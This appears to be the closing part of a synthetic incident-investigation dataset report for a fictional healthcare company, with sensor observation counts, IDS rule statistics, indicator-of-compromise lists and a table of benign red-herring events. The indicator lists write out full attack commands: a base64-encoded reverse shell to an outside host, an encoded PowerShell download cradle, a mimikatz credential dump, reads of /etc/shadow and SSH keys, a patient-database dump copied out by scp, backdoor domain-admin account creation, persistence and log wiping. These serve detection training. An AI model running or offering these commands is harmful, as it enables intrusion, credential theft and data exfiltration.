| dc72dc1a-bb8c-4f0a-acff-ebe55b28d8e6 | ids | filtered: 1 |
| dd18f4d8-5187-4a1f-8888-c5019271f763 | ids | delayed: 1 |
| dd4c8625-85c3-440b-9fc3-eb708904a765 | ids | delayed: 1 |
| e1f9627b-740d-4f8a-90ed-d04903e4586a | ids | delayed: 1 |
| e33e00b2-9e09-4497-a453-a74a75a9e73b | ids | delayed: 1 |
| e3763e7e-a169-459f-8bf3-c6fcc51db7db | ids | delayed: 1 |
| e706f98b-bb57-43c9-87b6-7a3742c3555d | ids | delayed: 1 |
| e767bdd3-eb55-44df-bf36-ecdcbfd6f664 | ids | delayed: 1 |
| e88a9031-ce12-4667-9235-e78f9e1bec95 | ids | delayed: 1 |
| ea56c17a-24c8-4485-be27-57704ec791e8 | ids | delayed: 1 |
| ec3cf2c3-37c3-4722-89e7-432cb8ff693e | ids | delayed: 1 |
| ec96638a-53fc-4110-a499-f4c5f50f31f4 | ids | delayed: 1 |
| evt-001 | asa | delayed: 6, filtered: 1 |
| evt-001 | ecar | delayed: 3 |
| evt-001 | ids | filtered: 1 |
| evt-001 | zeek | delayed: 4, filtered: 8, visible: 1 |
| evt-002 | asa | delayed: 413, filtered: 1, visible: 5 |
| evt-002 | ecar | delayed: 417, dropped: 2 |
| evt-002 | ids | delayed: 15 |
| evt-002 | web | delayed: 370, dropped: 4 |
| evt-002 | zeek | delayed: 589, filtered: 2, visible: 203 |
| evt-003 | syslog | delayed: 3 |
| evt-003 | zeek | delayed: 2 |
| evt-004 | asa | delayed: 2 |
| evt-004 | ecar | delayed: 2 |
| evt-004 | web | delayed: 2 |
| evt-004 | zeek | visible: 4 |
| evt-005 | asa | delayed: 2 |
| evt-005 | ecar | delayed: 4 |
| evt-005 | syslog | visible: 1 |
| evt-005 | web | delayed: 1 |
| evt-005 | zeek | delayed: 3 |
| evt-006 | asa | delayed: 31 |
| evt-006 | bash_history | visible: 6 |
| evt-006 | ecar | delayed: 55, dropped: 1 |
| evt-006 | syslog | delayed: 8 |
| evt-006 | sysmon | delayed: 10 |
| evt-006 | windows_security | delayed: 5 |
| evt-006 | zeek | delayed: 25, visible: 6 |
| evt-007 | bash_history | visible: 3 |
| evt-007 | ecar | delayed: 6 |
| evt-008 | asa | delayed: 4, filtered: 1 |
| evt-008 | bash_history | visible: 1 |
| evt-008 | ecar | delayed: 10 |
| evt-008 | ids | delayed: 2 |
| evt-008 | syslog | delayed: 4 |
| evt-008 | windows_security | delayed: 2, visible: 1 |
| evt-008 | zeek | delayed: 8 |
| evt-009 | bash_history | visible: 2 |
| evt-009 | ecar | delayed: 4 |
| evt-010 | ecar | delayed: 8 |
| evt-010 | sysmon | delayed: 8 |
| evt-010 | windows_security | delayed: 2 |
| evt-011 | ecar | delayed: 1 |
| evt-011 | syslog | delayed: 1 |
| evt-011 | windows_security | delayed: 2 |
| evt-012 | asa | delayed: 3, filtered: 5 |
| evt-012 | ecar | delayed: 14 |
| evt-012 | sysmon | delayed: 2 |
| evt-012 | windows_security | delayed: 23 |
| evt-012 | zeek | delayed: 9 |
| evt-013 | asa | delayed: 2, filtered: 1 |
| evt-013 | ecar | delayed: 41 |
| evt-013 | sysmon | delayed: 38 |
| evt-013 | windows_security | delayed: 15 |
| evt-013 | zeek | delayed: 4 |
| evt-014 | ecar | delayed: 13 |
| evt-014 | sysmon | delayed: 13 |
| evt-014 | windows_security | delayed: 2 |
| evt-015 | asa | delayed: 3 |
| evt-015 | ecar | delayed: 23 |
| evt-015 | sysmon | delayed: 21 |
| evt-015 | windows_security | delayed: 11 |
| evt-015 | zeek | delayed: 3, visible: 1 |
| evt-016 | ecar | delayed: 34 |
| evt-016 | sysmon | delayed: 34 |
| evt-016 | windows_security | delayed: 8, visible: 2 |
| evt-017 | asa | filtered: 2 |
| evt-017 | ecar | delayed: 33 |
| evt-017 | sysmon | delayed: 32 |
| evt-017 | windows_security | delayed: 11 |
| evt-017 | zeek | delayed: 1, visible: 2 |
| evt-018 | asa | delayed: 22, visible: 1 |
| evt-018 | ecar | delayed: 31 |
| evt-018 | proxy | delayed: 10 |
| evt-018 | sysmon | delayed: 18 |
| evt-018 | windows_security | delayed: 15 |
| evt-018 | zeek | delayed: 34, visible: 18 |
| evt-019 | asa | delayed: 4 |
| evt-019 | ecar | delayed: 4 |
| evt-019 | proxy | delayed: 4 |
| evt-019 | sysmon | delayed: 4 |
| evt-019 | zeek | delayed: 8 |
| evt-020 | asa | delayed: 21, filtered: 317 |
| evt-020 | ecar | delayed: 337, dropped: 1 |
| evt-020 | ids | delayed: 6, dropped: 2, filtered: 294 |
| evt-020 | sysmon | delayed: 18 |
| evt-020 | windows_security | delayed: 353, dropped: 1, visible: 1 |
| evt-020 | zeek | delayed: 510, dropped: 1, filtered: 2, visible: 163 |
| evt-021 | asa | delayed: 87, dropped: 2, visible: 2 |
| evt-021 | ecar | delayed: 89, dropped: 2 |
| evt-021 | ids | delayed: 18, dropped: 2, filtered: 160 |
| evt-021 | windows_security | delayed: 91 |
| evt-021 | zeek | delayed: 141, dropped: 1, visible: 40 |
| evt-022 | asa | delayed: 2 |
| evt-022 | ecar | delayed: 27 |
| evt-022 | sysmon | delayed: 26 |
| evt-022 | windows_security | delayed: 12 |
| evt-022 | zeek | delayed: 2 |
| evt-023 | asa | filtered: 4 |
| evt-023 | bash_history | visible: 11 |
| evt-023 | ecar | delayed: 38 |
| evt-023 | syslog | delayed: 10 |
| evt-023 | windows_security | delayed: 2 |
| evt-023 | zeek | delayed: 5, visible: 1 |
| evt-025 | asa | delayed: 4 |
| evt-025 | ecar | delayed: 32 |
| evt-025 | proxy | delayed: 1 |
| evt-025 | sysmon | delayed: 27 |
| evt-025 | windows_security | delayed: 9 |
| evt-025 | zeek | delayed: 6, visible: 4 |
| evt-026 | asa | delayed: 5, filtered: 3 |
| evt-026 | ecar | delayed: 9 |
| evt-026 | proxy | delayed: 3 |
| evt-026 | windows_security | delayed: 1 |
| evt-026 | zeek | delayed: 20, visible: 4 |
| evt-027 | ecar | delayed: 1 |
| evt-027 | windows_security | delayed: 2 |
| evt-028 | bash_history | visible: 1 |
| evt-028 | ecar | delayed: 2 |
| evt-029 | bash_history | visible: 1 |
| evt-029 | ecar | delayed: 3 |
| evt-030 | asa | delayed: 3 |
| evt-030 | ecar | delayed: 29 |
| evt-030 | proxy | delayed: 1 |
| evt-030 | sysmon | delayed: 27 |
| evt-030 | windows_security | delayed: 8 |
| evt-030 | zeek | delayed: 6, visible: 2 |
| evt-031 | asa | filtered: 3 |
| evt-031 | ecar | delayed: 3 |
| evt-031 | windows_security | delayed: 3 |
| evt-031 | zeek | delayed: 2, visible: 4 |
| evt-032 | ecar | delayed: 18 |
| evt-032 | sysmon | delayed: 18 |
| evt-032 | windows_security | delayed: 4 |
| evt-033 | ecar | delayed: 13 |
| evt-033 | sysmon | delayed: 12 |
| evt-033 | windows_security | delayed: 13 |
| evt-034 | ecar | delayed: 2 |
| evt-034 | sysmon | delayed: 1 |
| evt-034 | windows_security | delayed: 2 |
| evt-035 | ecar | delayed: 2 |
| evt-035 | syslog | delayed: 2 |
| evt-email-001 | asa | delayed: 5, filtered: 2 |
| evt-email-001 | ecar | delayed: 13 |
| evt-email-001 | proxy | delayed: 2 |
| evt-email-001 | syslog | delayed: 10 |
| evt-email-001 | sysmon | delayed: 7 |
| evt-email-001 | windows_security | delayed: 5 |
| evt-email-001 | zeek | delayed: 6, visible: 10 |
| evt-email-002 | asa | delayed: 2 |
| evt-email-002 | ecar | delayed: 2 |
| evt-email-002 | proxy | delayed: 1 |
| evt-email-002 | sysmon | delayed: 1 |
| evt-email-002 | zeek | delayed: 2, visible: 2 |
| evt-email-003 | asa | delayed: 8, filtered: 2 |
| evt-email-003 | ecar | delayed: 25 |
| evt-email-003 | syslog | delayed: 14 |
| evt-email-003 | sysmon | delayed: 24 |
| evt-email-003 | windows_security | delayed: 16 |
| evt-email-003 | zeek | delayed: 15, visible: 9 |
| evt-email-004 | all | out_of_window: 8 |
| evt-email-004 | asa | delayed: 6, filtered: 3 |
| evt-email-004 | ecar | delayed: 16 |
| evt-email-004 | syslog | delayed: 18 |
| evt-email-004 | sysmon | delayed: 3 |
| evt-email-004 | windows_security | delayed: 5 |
| evt-email-004 | zeek | delayed: 24, visible: 2 |
| evt-email-005 | asa | delayed: 3 |
| evt-email-005 | ecar | delayed: 4 |
| evt-email-005 | syslog | delayed: 2 |
| evt-email-005 | windows_security | delayed: 2 |
| evt-email-005 | zeek | delayed: 4, visible: 4 |
| evt-email-006 | asa | delayed: 3 |
| evt-email-006 | ecar | delayed: 5, dropped: 1 |
| evt-email-006 | syslog | delayed: 8 |
| evt-email-006 | sysmon | delayed: 5 |
| evt-email-006 | windows_security | delayed: 3 |
| evt-email-006 | zeek | delayed: 7, visible: 2 |
| evt-email-007 | asa | delayed: 7, filtered: 1 |
| evt-email-007 | ecar | delayed: 13 |
| evt-email-007 | syslog | delayed: 8, dropped: 1 |
| evt-email-007 | windows_security | delayed: 5 |
| evt-email-007 | zeek | delayed: 20, visible: 4 |
| evt-email-008 | asa | delayed: 8, filtered: 2 |
| evt-email-008 | ecar | delayed: 30 |
| evt-email-008 | proxy | delayed: 2 |
| evt-email-008 | syslog | delayed: 11 |
| evt-email-008 | sysmon | delayed: 24 |
| evt-email-008 | windows_security | delayed: 9, visible: 1 |
| evt-email-008 | zeek | delayed: 20, visible: 4 |
| evt-email-009 | asa | delayed: 1 |
| evt-email-009 | ecar | delayed: 1 |
| evt-email-009 | syslog | delayed: 2 |
| evt-email-009 | sysmon | delayed: 1 |
| evt-email-009 | windows_security | delayed: 1 |
| evt-email-009 | zeek | visible: 2 |
| evt-email-010 | asa | delayed: 2 |
| evt-email-010 | ecar | delayed: 2 |
| evt-email-010 | syslog | delayed: 2 |
| evt-email-010 | zeek | delayed: 5, visible: 4 |
| evt-email-011 | asa | delayed: 8, filtered: 2 |
| evt-email-011 | ecar | delayed: 11 |
| evt-email-011 | proxy | delayed: 1 |
| evt-email-011 | syslog | delayed: 9 |
| evt-email-011 | sysmon | delayed: 5 |
| evt-email-011 | windows_security | delayed: 9 |
| evt-email-011 | zeek | delayed: 10, visible: 19 |
| f0894ede-d895-47b7-b91b-1d6f2ee9ce12 | ids | delayed: 1 |
| f2124894-1653-48f0-bd4c-7a62fa8344dd | ids | delayed: 1 |
| f3437bf3-be87-45ba-ae16-465a128a64c4 | ids | delayed: 2 |
| f6af6637-6bde-4137-96aa-a00b4b7e7816 | ids | delayed: 1 |
| f7a94c0e-7b42-4a8c-9fb7-5f146ac9b776 | ids | delayed: 1 |
| f9670150-4747-4004-bae9-34a7abf69dc5 | ids | delayed: 2 |
| f9686ad2-0477-42d6-88c2-584362ced82a | ids | delayed: 1 |
| fadf201e-089a-4635-8904-e78ec33ec65b | ids | delayed: 1 |
| fb0ff928-52e5-4e99-8808-344c95f3048c | ids | delayed: 1 |
| feb3489f-eb83-4487-b7d9-a38539401d5f | ids | delayed: 1 |
| ffad860a-7472-48ac-9a39-7d8861252793 | ids | delayed: 1 |
| red_herring:rh-001 | ecar | delayed: 3 |
| red_herring:rh-001 | windows_security | delayed: 3 |
| red_herring:rh-002 | asa | delayed: 1 |
| red_herring:rh-002 | ecar | delayed: 34 |
| red_herring:rh-002 | sysmon | delayed: 33 |
| red_herring:rh-002 | windows_security | delayed: 8 |
| red_herring:rh-002 | zeek | delayed: 1 |
| red_herring:rh-003 | asa | delayed: 3 |
| red_herring:rh-003 | ecar | delayed: 6 |
| red_herring:rh-003 | ids | delayed: 1 |
| red_herring:rh-003 | proxy | delayed: 1 |
| red_herring:rh-003 | windows_security | delayed: 1 |
| red_herring:rh-003 | zeek | delayed: 6 |


## IDS Evaluation Summary

Observation totals: delayed=181, dropped=4, filtered=456, visible=2.

| Sensor | GID:SID | Candidates | Emitted | Policy Filtered | Origins | Digest |
|--------|---------|------------|---------|-----------------|---------|--------|
| snort-core | 1:2000357 | 2 | 2 | 0 | built_in=2 | `64fe48b30e33` |
| snort-core | 1:2000560 | 2 | 2 | 0 | built_in=2 | `6d9a4639f530` |
| snort-core | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `15694bb7a3a7` |
| snort-core | 1:2016149 | 1 | 1 | 0 | built_in=1 | `ffe8badc1a99` |
| snort-core | 1:2024291 | 7 | 7 | 0 | built_in=7 | `5fd20830c9db` |
| snort-core | 1:2027757 | 6 | 6 | 0 | built_in=6 | `db936f897188` |
| snort-core | 1:2027863 | 13 | 13 | 0 | built_in=13 | `bfac11edb9c5` |
| snort-core | 1:2027865 | 93 | 13 | 80 | authored_attachment=9, built_in=4 | `d62be7c7538d` |
| snort-core | 1:2029706 | 307 | 13 | 294 | authored_attachment=6, built_in=7 | `825acf77df42` |
| snort-perimeter | 1:2000334 | 3 | 3 | 0 | built_in=3 | `d8db1d885fcc` |
| snort-perimeter | 1:2000357 | 2 | 2 | 0 | built_in=2 | `8489f9d93c13` |
| snort-perimeter | 1:2000428 | 6 | 6 | 0 | built_in=6 | `57f7762f8f39` |
| snort-perimeter | 1:2000560 | 3 | 3 | 0 | built_in=3 | `890858394874` |
| snort-perimeter | 1:2000575 | 3 | 3 | 0 | built_in=3 | `387583350225` |
| snort-perimeter | 1:2002910 | 16 | 15 | 1 | built_in=15 | `0a2adb2799dc` |
| snort-perimeter | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `c12a6abe71c5` |
| snort-perimeter | 1:2003068 | 3 | 3 | 0 | built_in=3 | `fcce58941ec9` |
| snort-perimeter | 1:2010935 | 1 | 1 | 0 | built_in=1 | `54646f3f7edc` |
| snort-perimeter | 1:2013028 | 3 | 3 | 0 | built_in=3 | `93f10fb42365` |
| snort-perimeter | 1:2013504 | 2 | 2 | 0 | authored_attachment=1, built_in=1 | `4e026b91aef0` |
| snort-perimeter | 1:2016149 | 5 | 5 | 0 | built_in=5 | `bfd41c1e94b4` |
| snort-perimeter | 1:2016360 | 5 | 5 | 0 | built_in=5 | `fa16eba17950` |
| snort-perimeter | 1:2018959 | 3 | 3 | 0 | built_in=3 | `f4f6aff25dfa` |
| snort-perimeter | 1:2022476 | 2 | 2 | 0 | built_in=2 | `1c1b59aa4bb0` |
| snort-perimeter | 1:2023672 | 3 | 3 | 0 | built_in=3 | `cba1d6bc2498` |
| snort-perimeter | 1:2023882 | 7 | 7 | 0 | built_in=7 | `54891d52e503` |
| snort-perimeter | 1:2024290 | 3 | 3 | 0 | built_in=3 | `b8469c34ed3e` |
| snort-perimeter | 1:2024291 | 2 | 2 | 0 | built_in=2 | `c67d6d39c0a8` |
| snort-perimeter | 1:2024392 | 1 | 1 | 0 | built_in=1 | `5bf68e6ba8f5` |
| snort-perimeter | 1:2024897 | 2 | 2 | 0 | built_in=2 | `03d42a85b8f9` |
| snort-perimeter | 1:2025712 | 4 | 4 | 0 | built_in=4 | `66ff0a15e011` |
| snort-perimeter | 1:2025991 | 6 | 6 | 0 | built_in=6 | `1e029ab168b1` |
| snort-perimeter | 1:2027316 | 1 | 1 | 0 | built_in=1 | `c5dbf5d8d090` |
| snort-perimeter | 1:2027757 | 2 | 2 | 0 | built_in=2 | `9b116c45ff2f` |
| snort-perimeter | 1:2027863 | 5 | 5 | 0 | built_in=5 | `0636bab964ff` |
| snort-perimeter | 1:2027865 | 89 | 9 | 80 | authored_attachment=9 | `0fb0685d02ae` |
| snort-perimeter | 1:2028401 | 7 | 7 | 0 | built_in=7 | `c3e7c5c0fa57` |
| snort-perimeter | 1:2029706 | 2 | 2 | 0 | built_in=2 | `6463a6f6529f` |
| snort-perimeter | 1:366 | 4 | 4 | 0 | built_in=4 | `8098296b631b` |
| snort-perimeter | 1:382 | 6 | 6 | 0 | built_in=6 | `5ea89c4b43ed` |
| snort-perimeter | 1:384 | 4 | 4 | 0 | built_in=4 | `1b71a0e0767a` |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.10.1.35 (Attacker IP)
- 10.10.1.35:3389 (Lateral Movement)
- 10.10.1.99 (Attacker IP)
- 10.10.2.10:389 (Internal Server)
- 10.10.2.30:22 (Lateral Movement)
- 10.10.3.10:443 (Web Scan Target)
- 10.10.3.20:22 (Internal Server)
- 10.10.4.10:22 (Lateral Movement)
- 203.14.220.10:443 (C2 Server)
- 2j3rhpi2329sn.top (DGA Domain)
- 30rgw6r7503.top (DGA Domain)
- 45.33.32.30:443 (Beacon Target)
- 45.33.32.30:443 (C2 Server)
- 45.33.32.30:443 (Denied Beacon Target)
- 45.33.32.30:8443 (C2 Server)
- 6cja6syvo02mu.top (DGA Domain)
- DC-01.meridianhcs.local (Malicious DNS Query)
- Message-ID: <100000I9EMNA.1000OREDIL@meridianhcs.com>
- Message-ID: <1000016ONZTK.10015EDCND@meridianhcs.com>
- Message-ID: <121609FF-AFF2-1350-BCEC-8A52032BE7D0@meridianhcs.com>
- Message-ID: <1486572785.976919.3e76dbd7@meridianhcs.com>
- Message-ID: <1746897100.499514.89c6aefa@meridianhcs.com>
- Message-ID: <billing-a1f65b41-3807664@medclaims-processing.net>
- Message-ID: <notices-b9dac45a-8235363@benefits-serviceportal.com>
- Message-ID: <workspace-e2b1dcaf-9440641@docflow-health.net>
- Port 22 (scan target)
- Port 3306 (scan target)
- Port 443 (scan target)
- Port 80 (scan target)
- Port 8080 (scan target)
- Port 8443 (scan target)
- SMTP Zeek UID: C6KtBe09nLqwATyNjH
- SMTP Zeek UID: C8FEEE2Ngum18GAvV
- SMTP Zeek UID: CCH0oMMtZz3ocMPODX
- SMTP Zeek UID: CCLThcZpG6JLKVCMuop
- SMTP Zeek UID: CECsr5zwZ1q3WBSbCW
- SMTP Zeek UID: CHx9OSq6ImLK5LHlTQ
- SMTP Zeek UID: CNVYZKnYYnQMt8VBTL
- SMTP Zeek UID: COvNpY1Gbhw78aIg59
- SMTP Zeek UID: CRjx3d1XwAyWLYNFFT
- SMTP Zeek UID: CVlVGh6GGToxHDlM8vn
- SMTP Zeek UID: CXZgXleyT4RDlfad8d
- SMTP Zeek UID: CboayZ4qBr5sHOISr
- SMTP Zeek UID: CelCG7qqwIxDgmrGDI
- SMTP Zeek UID: CoCE31IwWIq19DPOfG
- SMTP Zeek UID: CxqPXdNDXBwSd8laIcH
- Zeek UID: C4Fmq8RXtdD7RSexxkl
- Zeek UID: CFEILIJzQD4QE6gXpSW
- Zeek UID: CFbzIm0dAkzEvnjfot
- Zeek UID: CKZ8KOPhVr9c7BtBPmX
- Zeek UID: CPxBu3Ut1uH9qCa9yy
- Zeek UID: CS2h7ir7BegQ2YQsAX
- Zeek UID: CcrDXztsHLNYgdt4OI
- Zeek UID: CdFuzlOcf5iAq2cm6c
- Zeek UID: CjSy8xT0S0sab0punq
- Zeek UID: CqpA6g8vrvFAdmrikM5
- api.westbridge-services.net (Malicious DNS Query)
- edge.westbridge-services.net (Malicious DNS Query)
- ewnjsaqf1rasgez5.top (DGA Domain)
- metrics.westbridge-services.net (Malicious DNS Query)
- ns1.westbridge-services.cloud (DNS Tunnel Endpoint)
- qrdqtp5nhn66chp00.top (DGA Domain)

### Process IOCs

- /bin/bash
- /usr/bin/cat
- /usr/bin/find
- /usr/bin/gzip
- /usr/bin/ls
- /usr/bin/mysqldump
- /usr/bin/nmap
- /usr/bin/scp
- /usr/bin/shred
- /usr/sbin/ip
- C:\Windows\System32\PSEXESVC.exe
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\cmd.exe
- C:\Windows\System32\ms-index-service.exe
- C:\Windows\System32\net.exe
- C:\Windows\System32\sc.exe
- C:\Windows\System32\schtasks.exe
- C:\Windows\System32\wevtutil.exe
- C:\Windows\System32\whoami.exe
- Injection Target: C:\Windows\System32\lsass.exe
- Scheduled Task: \Microsoft\Windows\Maintenance\DeviceSync
- Service: DeviceSyncSvc
- Service: PSEXESVC
- `PSEXESVC.exe -accepteula`
- `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'`
- `cat /etc/hosts`
- `cat /etc/passwd`
- `cat /etc/resolv.conf`
- `cat /etc/shadow`
- `cat /root/.ssh/id_rsa`
- `cat /var/www/html/config.php`
- `cmd.exe /c whoami && hostname`
- `find /opt/ehr -name '*credential*' -maxdepth 3`
- `gzip -9 /tmp/rpt_0318.sql`
- `history -c && cat /dev/null > ~/.bash_history`
- `ip addr show`
- `ls -la /root/.ssh`
- `ms-index-service.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
- `mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql`
- `net group "Domain Admins" /domain`
- `net group "Domain Admins" svc_mhsync /add /domain`
- `net user /domain`
- `net user svc_mhsync /delete /domain`
- `net user svc_mhsync MhsSvc!2024 /add /domain`
- `net view /domain`
- `net view \\FILE-SRV-01`
- `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24`
- `nmap -sn 10.10.2.0/24`
- `powershell.exe -NoProfile -Command "Compress-Archive -Path \\FILE-SRV-01\Finance\Q1\*,\\FILE-SRV-01\Patients\Exports\* -DestinationPath C:\ProgramData\Microsoft\cache_7f3a.zip"`
- `powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBhAHAAaQAuAHcAZQBzAHQAYgByAGkAZABnAGUALQBzAGUAcgB2AGkAYwBlAHMALgBuAGUAdAAvAHYAMgAvAG0AYQBuAGkAZgBlAHMAdAAiACkA`
- `sc.exe create DeviceSyncSvc binPath= C:\Windows\System32\DeviceSyncSvc.exe obj= LocalSystem start= auto`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\DeviceSync" /SC HOURLY /TR "C:\Windows\System32\DeviceSyncSvc.exe" /RU SYSTEM`
- `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz`
- `shred -u /root/.bash_history`
- `wevtutil cl Security`
- `whoami /all`

### User IOCs

- Group: Domain Admins (compromised account)
- SYSTEM (compromised account)
- aisha.johnson (compromised account)
- aisha.johnson (Spray Target) (compromised account)
- apache (compromised account)
- diego.ramirez (compromised account)
- diego.ramirez (Spray Target) (compromised account)
- evelyn.brooks (compromised account)
- lina.nguyen (compromised account)
- marcus.chen (compromised account)
- marcus.chen (Explicit Credential Target) (compromised account)
- omar.haddad (compromised account)
- priya.patel (compromised account)
- root (compromised account)
- sophia.martinez (Spray Target) (compromised account)
- svc_mhsync (compromised account)

### File IOCs

- %SystemRoot%\PSEXESVC.exe
- /root/.bash_history
- /tmp/rpt_0318.sql
- C:\Windows\System32\DeviceSyncSvc.exe
- artifacts/email/benefits-confirmation-msg.eml
- artifacts/email/docflow-ai-summary-msg.eml
- artifacts/email/ehr-release-note-msg.eml
- artifacts/email/executive-operating-note-msg.eml
- artifacts/email/finance-forward-to-it-msg.eml
- artifacts/email/internal-reset-lure-msg.eml
- artifacts/email/vendor-interface-package-msg.eml


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2024-03-18 13:05:24 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:05:25 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:05:27 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:05:33 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 14:05:21 UTC | lina.nguyen | WS-LNGUYEN-01 | Developer refreshes Ubuntu package metadata from the public archive | Routine package maintenance uses the APT HTTP user agent and triggers a low-priority policy alert. |
| 2024-03-18 17:09:54 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:09:55 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:09:57 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
